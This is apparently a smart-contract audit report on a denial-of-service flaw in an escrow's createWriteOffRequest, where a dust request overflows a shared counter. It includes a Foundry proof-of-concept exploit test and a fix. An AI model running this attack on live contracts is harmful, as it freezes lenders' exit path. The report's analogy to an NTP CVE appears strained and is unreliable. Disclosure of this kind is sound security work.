### Title
Malicious lender permanently DoSes `createWriteOffRequest` for all users by inflating `pendingUnderlyings` to near `type(uint256).max` - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
CVE-2015-7854 is a buffer overflow in NTP's password/key-file handling: an authenticated user supplies a crafted input blob that corrupts a shared buffer and crashes the daemon for everyone. The closest analog in this codebase is the write-off escrow's shared accounting counter. `createWriteOffRequest` lets any tranche-token holder write an attacker-chosen `underlyingsRequested` into the global `pendingUnderlyings` with no upper bound. A single attacker request with `underlyingsRequested` close to `type(uint256).max` makes every subsequent `createWriteOffRequest` overflow and revert, permanently crashing the write-off market for all other lenders — the same bug shape (crafted input → shared-state corruption → service crash), mapped onto Solidity checked-arithmetic reverts instead of memory corruption.

### Finding Description
In `IdleCreditVaultWriteOffEscrow.createWriteOffRequest` the only validation on the requested payout is that `amount != 0` — `underlyingsRequested` is unconstrained:

```solidity
if (amount == 0) revert NotAllowed();
IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
...
userRequests[msg.sender] = WriteOffRequest({
  tranches: currentRequest.tranches + amount,
  underlyings: currentRequest.underlyings + underlyingsRequested
});
pendingUnderlyings += underlyingsRequested;
``` [1](#0-0) 

An attacker (any KYC'd lender holding ≥1 wei of the AA or BB tranche, while `isEpochRunning()` is true) calls `createWriteOffRequest(1, type(uint256).max)`. Their own struct write `0 + type(uint256).max` succeeds, and `pendingUnderlyings` becomes `type(uint256).max`. From that point, any other user's `createWriteOffRequest(x, y)` for `y > 0` reverts on `pendingUnderlyings += y` (overflow in Solidity 0.8.10). A request with `underlyingsRequested = 0` is useless to a lender, so effectively no one can open a write-off request. The attacker's own `deleteWriteOffRequest` still works (line 112 uses a saturating subtraction, so it restores `pendingUnderlyings` to 0), meaning the attacker can release and re-arm the DoS at will — including re-arming it inside the same block via a fresh account whenever a victim's request is about to land.

Note the attacker's own request is unfulfillable (`_underlyings >= type(uint256).max` is impossible at line 129), but the attacker never intends fulfillment — the goal is saturating the shared counter, not completing the trade.

### Impact Explanation
The write-off escrow is the protocol's trustless exit mechanism for impaired tranche debt: it is exactly during a running epoch with distressed credit that lenders need to sell tranche tokens to a fulfiller/borrower. Blocking `createWriteOffRequest` for everyone permanently (as long as the attacker keeps the dust request open) freezes that exit path for all lenders of this tranche — a temporary freezing of the write-off market with direct fund impact (lenders cannot negotiate discounted exits; the cost to sustain the attack is 1 wei of tranche tokens plus one-time gas). This mirrors the CVE's authenticated-crafted-input → daemon crash → denial of the affected service, with the "service" here being the write-off facility rather than a network daemon.

### Likelihood Explanation
- Attacker profile: in scope — any tranche-token holder, `EpochNotRunning` gate only requires the epoch to be running, `amount` can be 1 wei.
- No privileged cooperation needed; owner/manager/borrower all remain honest.
- Guards do not help: `nonReentrant`, `NotAllowed` checks, and the saturating subtraction in `deleteWriteOffRequest`/`fullfillWriteOffRequest` (lines 112, 134) were written to protect `pendingUnderlyings` from underflow, but nothing bounds the additive side.
- One subtlety: `userRequests[msg.sender].underlyings + underlyingsRequested` also overflows on the attacker's *second* call, so one account can only set the counter once per epoch — but the attacker can rotate fresh accounts cheaply (each needs only a dust tranche balance, which they can self-transfer after deleting their previous request).

### Recommendation
Cap `underlyingsRequested` to a sane bound tied to real exposure, e.g. reject values larger than the tranche's claimable value:

```solidity
uint256 maxClaim = amount * IdleCDOEpochVariant(idleCDOEpoch).virtualPrice(tranche) / ONE_TRANCHE;
if (underlyingsRequested == 0 || underlyingsRequested > maxClaim) revert NotAllowed();
```

Alternatively, drop `pendingUnderlyings` accumulation entirely if it is only informational, or track it as `pendingUnderlyings += underlyingsRequested` inside an `unchecked` block only after bounding the per-user value. Either removes the single-point overflow that one dust request can trigger.

### Proof of Concept
Foundry PoC sketch (run against a fork where an `IdleCreditVaultWriteOffEscrow` instance is wired to a running `IdleCDOEpochVariant`):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;
import "forge-std/Test.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract WriteOffEscrowOverflowDosTest is Test {
    IdleCreditVaultWriteOffEscrow escrow;
    IERC20Detailed tranche;
    address attacker = address(0xA77);
    address victim   = address(0xB0B);

    function setUp() public {
        escrow  = IdleCreditVaultWriteOffEscrow(<deployed escrow>);
        tranche = IERC20Detailed(escrow.tranche());
        // fund both accounts with dust tranche tokens (deal/whale transfer in fork test)
        deal(address(tranche), attacker, 2);
        deal(address(tranche), victim, 100e18);
    }

    function testPendingUnderlyingsOverflowBlocksAllRequests() public {
        // attacker saturates the shared counter with a 1-wei tranche deposit
        vm.startPrank(attacker);
        tranche.approve(address(escrow), 1);
        escrow.createWriteOffRequest(1, type(uint256).max);
        vm.stopPrank();
        assertEq(escrow.pendingUnderlyings(), type(uint256).max);

        // victim's legitimate request now always reverts via overflow
        vm.startPrank(victim);
        tranche.approve(address(escrow), 100e18);
        vm.expectRevert(); // arithmetic overflow in pendingUnderlyings += underlyingsRequested
        escrow.createWriteOffRequest(100e18, 50e18);
        vm.stopPrank();

        // attacker can release and re-arm at will
        vm.prank(attacker);
        escrow.deleteWriteOffRequest(); // pendingUnderlyings back to 0
        assertEq(escrow.pendingUnderlyings(), 0);
    }
}
```

No state-changing attack needs privileged calls; the entire path is attacker-only transactions during a running epoch.

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
